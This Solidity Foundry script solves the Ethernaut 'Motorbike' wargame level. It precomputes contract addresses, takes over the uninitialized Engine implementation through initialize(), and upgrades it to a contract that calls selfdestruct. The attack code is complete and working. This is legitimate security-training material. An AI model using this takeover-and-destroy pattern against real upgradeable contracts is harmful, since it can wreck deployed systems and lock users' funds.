// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/IEthernaut.sol";

interface IMotorbike {
    function createInstance(address _player) external returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

contract MotorbikeAttackScript is Script {
    function run() public {
        address ethernautAddress = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
        // Due inclusion of EIP-6780 in cancun hardfork, SELFDESTRUCT should be called in the same transaction that deploys the instance to cause same effect, therfore this level is not directly solvable by an EOA.
        // Get motorbikeAddress nounce and compute instance address
        address motorbikeAddress = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
        uint64 nonce = vm.getNonce(motorbikeAddress);
        address engineAddress = ComputeAddress.computeAddress(motorbikeAddress, nonce);
        address instanceAddress = ComputeAddress.computeAddress(motorbikeAddress, nonce + 1);

        console.log("Engine Address: ", engineAddress);
        console.log("Instance Address: ", instanceAddress);
        console.log("Nonce", nonce);

        vm.startBroadcast();
        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();
        motorbikeAttacker.attack(ethernautAddress, motorbikeAddress, engineAddress);
        motorbikeAttacker.submitInstance(ethernautAddress, instanceAddress);
        vm.stopBroadcast();
    }
}

contract MotorbikeAttacker {
    function attack(address ethernaut, address motorbike, address engine) public {
        IEthernaut ethernaut = IEthernaut(ethernaut);
        //console.logBytes32(engine.codehash);
        // 1. Create level instance of Motorbike.
        ethernaut.createLevelInstance(motorbike);
        // 2. Attack Engine
        engine.call(abi.encodeWithSignature("initialize()"));
        MotorbikeAttack attacker = new MotorbikeAttack();
        engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)", address(attacker), abi.encodeWithSignature("kill()")
            )
        );
        //console.logBytes32(engine.codehash);
    }

    function submitInstance(address ethernaut, address instance) public {
        IEthernaut ethernaut = IEthernaut(ethernaut);
        ethernaut.submitLevelInstance(instance);
    }
}

contract MotorbikeAttack {
    function kill() public payable {
        selfdestruct(payable(address(0)));
    }
}

library ComputeAddress {
    // Function from pcaversaccio https://github.com/pcaversaccio/create-util/blob/main/contracts/Create.sol
    function computeAddress(address addr, uint256 nonce) public view returns (address) {
        bytes memory data;
        bytes1 len = bytes1(0x94);

        /**
         * @dev The theoretical allowed limit, based on EIP-2681, for an account nonce is 2**64-2:
         * https://eips.ethereum.org/EIPS/eip-2681.
         */
        if (nonce > type(uint64).max - 1) revert();

        /**
         * @dev The integer zero is treated as an empty byte string and therefore has only one
         * length prefix, 0x80, which is calculated via 0x80 + 0.
         */
        if (nonce == 0x00) {
            data = abi.encodePacked(bytes1(0xd6), len, addr, bytes1(0x80));
        }
        /**
         * @dev A one-byte integer in the [0x00, 0x7f] range uses its own value as a length prefix,
         * there is no additional "0x80 + length" prefix that precedes it.
         */
        else if (nonce <= 0x7f) {
            data = abi.encodePacked(bytes1(0xd6), len, addr, uint8(nonce));
        }
        /**
         * @dev In the case of `nonce > 0x7f` and `nonce <= type(uint8).max`, we have the following
         * encoding scheme (the same calculation can be carried over for higher nonce bytes):
         * 0xda = 0xc0 (short RLP prefix) + 0x1a (= the bytes length of: 0x94 + address + 0x84 + nonce, in hex),
         * 0x94 = 0x80 + 0x14 (= the bytes length of an address, 20 bytes, in hex),
         * 0x84 = 0x80 + 0x04 (= the bytes length of the nonce, 4 bytes, in hex).
         */
        else if (nonce <= type(uint8).max) {
            data = abi.encodePacked(bytes1(0xd7), len, addr, bytes1(0x81), uint8(nonce));
        } else if (nonce <= type(uint16).max) {
            data = abi.encodePacked(bytes1(0xd8), len, addr, bytes1(0x82), uint16(nonce));
        } else if (nonce <= type(uint24).max) {
            data = abi.encodePacked(bytes1(0xd9), len, addr, bytes1(0x83), uint24(nonce));
        } else if (nonce <= type(uint32).max) {
            data = abi.encodePacked(bytes1(0xda), len, addr, bytes1(0x84), uint32(nonce));
        } else if (nonce <= type(uint40).max) {
            data = abi.encodePacked(bytes1(0xdb), len, addr, bytes1(0x85), uint40(nonce));
        } else if (nonce <= type(uint48).max) {
            data = abi.encodePacked(bytes1(0xdc), len, addr, bytes1(0x86), uint48(nonce));
        } else if (nonce <= type(uint56).max) {
            data = abi.encodePacked(bytes1(0xdd), len, addr, bytes1(0x87), uint56(nonce));
        } else {
            data = abi.encodePacked(bytes1(0xde), len, addr, bytes1(0x88), uint64(nonce));
        }

        return address(uint160(uint256(keccak256(data))));
    }
}
